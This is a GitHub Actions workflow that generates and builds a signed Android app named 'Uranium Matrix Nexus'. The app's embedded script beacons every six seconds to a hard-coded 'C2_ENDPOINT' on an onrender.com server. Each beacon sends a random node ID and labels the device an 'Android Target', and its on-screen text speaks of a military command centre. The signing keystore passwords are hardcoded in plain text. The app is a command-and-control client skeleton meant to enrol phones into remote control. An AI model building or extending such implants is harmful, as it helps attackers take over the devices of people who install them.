name: Build Uranium Matrix Nexus v1000 APK

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: Setup Android SDK
      uses: android-actions/setup-android@v3
      with:
        cmdline-tools-version: "latest"
        packages: "platforms;android-34 build-tools;34.0.0"

    - name: Setup Gradle 8.7
      uses: gradle/actions/setup-gradle@v3
      with:
        gradle-version: 8.7

    - name: Generate Android Project & Build APK
      run: |
        echo "📂 جاري إنشاء مشروع أندرويد متكامل وربطه بسيرفر Render..."
        rm -rf android_project
        
        mkdir -p android_project/app/src/main/assets/www
        mkdir -p android_project/app/src/main/res/values
        mkdir -p android_project/app/src/main/java/com/uranium/matrix/nexus
        
        # إنشاء ملف الواجهة والاتصال الموجه مباشرة لسيرفرك
        cat << 'EOF' > android_project/app/src/main/assets/www/index.html
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Uranium Matrix Nexus</title>
        </head>
        <body style="background:#000;color:#00ff66;font-family:monospace;padding:20px;text-align:center;">
            <h2>[☢️] URANIUM MATRIX NEXUS v1000 [☢️]</h2>
            <p>جارٍ تشغيل العقدة والاتصال بمركز القيادة العسكرية...</p>
            <p id="status" style="color:#ff0;">الحالة: جاري الاتصال...</p>
            <script>
                const C2_ENDPOINT = "https://uranium-matrix-nexus-v1000.onrender.com/api/v1000/nexus/stream";
                const nodeId = "nexus_" + Math.random().toString(36).substring(2, 10);
                
                async function syncNode() {
                    try {
                        const response = await fetch(C2_ENDPOINT, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                node_id: nodeId,
                                model: navigator.userAgent.includes('Mobile') ? 'Android Target' : 'Nexus Node',
                                os: 'Android OS',
                                payload: ''
                            })
                        });
                        document.getElementById('status').innerText = '✅ متصل - العقدة: ' + nodeId;
                    } catch (e) {
                        document.getElementById('status').innerText = '⚠️ فشل الاتصال - إعادة المحاولة...';
                        console.error("Connection Stream Error", e);
                    }
                }
                setInterval(syncNode, 6000);
                syncNode();
            </script>
        </body>
        </html>
        EOF
        
        cat << 'EOF' > android_project/app/src/main/res/values/strings.xml
        <resources>
            <string name="app_name">Uranium Matrix Nexus</string>
        </resources>
        EOF
        
        cat << 'EOF' > android_project/build.gradle
        buildscript {
            repositories {
                google()
                mavenCentral()
            }
            dependencies {
                classpath 'com.android.tools.build:gradle:8.5.2'
            }
        }
        allprojects {
            repositories {
                google()
                mavenCentral()
            }
        }
        EOF

        cat << 'EOF' > android_project/settings.gradle
        rootProject.name = "UraniumNexus"
        include ':app'
        EOF

        # ✅ تم إصلاح التكرار: buildTypes مكتوبة مرة واحدة فقط
        cat << 'EOF' > android_project/app/build.gradle
        plugins {
            id 'com.android.application'
        }
        android {
            namespace 'com.uranium.matrix.nexus'
            compileSdk 34
            defaultConfig {
                applicationId "com.uranium.matrix.nexus"
                minSdk 21
                targetSdk 34
                versionCode 1000
                versionName "1.0.0"
            }
            signingConfigs {
                release {
                    storeFile file('keystore.jks')
                    storePassword 'uranium123'
                    keyAlias 'uranium'
                    keyPassword 'uranium123'
                }
            }
            buildTypes {
                release {
                    signingConfig signingConfigs.release
                    minifyEnabled false
                }
            }
            compileOptions {
                sourceCompatibility JavaVersion.VERSION_17
                targetCompatibility JavaVersion.VERSION_17
            }
        }
        EOF

        cat << 'EOF' > android_project/app/src/main/AndroidManifest.xml
        <manifest xmlns:android="http://schemas.android.com/apk/res/android"
            package="com.uranium.matrix.nexus">
            <uses-permission android:name="android.permission.INTERNET" />
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
            <application
                android:allowBackup="true"
                android:label="@string/app_name"
                android:supportsRtl="true"
                android:usesCleartextTraffic="true"
                android:theme="@android:style/Theme.Material.NoActionBar">
                <activity
                    android:name=".MainActivity"
                    android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.MAIN" />
                        <category android:name="android.intent.category.LAUNCHER" />
                    </intent-filter>
                </activity>
            </application>
        </manifest>
        EOF

        cat << 'EOF' > android_project/app/src/main/java/com/uranium/matrix/nexus/MainActivity.java
        package com.uranium.matrix.nexus;
        import android.app.Activity;
        import android.os.Bundle;
        import android.webkit.WebView;
        import android.webkit.WebSettings;
        public class MainActivity extends Activity {
            @Override
            protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                WebView webView = new WebView(this);
                WebSettings webSettings = webView.getSettings();
                webSettings.setJavaScriptEnabled(true);
                webSettings.setDomStorageEnabled(true);
                webSettings.setAllowFileAccess(true);
                webSettings.setAllowContentAccess(true);
                webView.loadUrl("file:///android_asset/www/index.html");
                setContentView(webView);
            }
        }
        EOF

        cd android_project
        
        echo "🔑 جاري توليد مفتاح التوقيع الرقمي الآمن..."
        keytool -genkey -v -keystore app/keystore.jks -keyalg RSA -keysize 2048 -validity 10000 \
          -alias uranium -storepass uranium123 -keypass uranium123 \
          -dname "CN=Uranium, OU=Dev, O=Uranium, L=Sanaa, S=Sanaa, C=YE"
        
        gradle wrapper --gradle-version 8.7 --distribution-type bin
        chmod +x gradlew
        
        echo "🔨 بدء البناء وتوقيع الحزمة البرمجية..."
        ./gradlew assembleRelease --no-daemon --warning-mode=none
        
        echo "✅ اكتمل البناء بنجاح تام!"
        ls -la app/build/outputs/apk/release/

    - name: Upload Signed APK
      uses: actions/upload-artifact@v4
      with:
        name: Uranium-Matrix-Nexus-v1000-SIGNED
        path: android_project/app/build/outputs/apk/release/*.apk
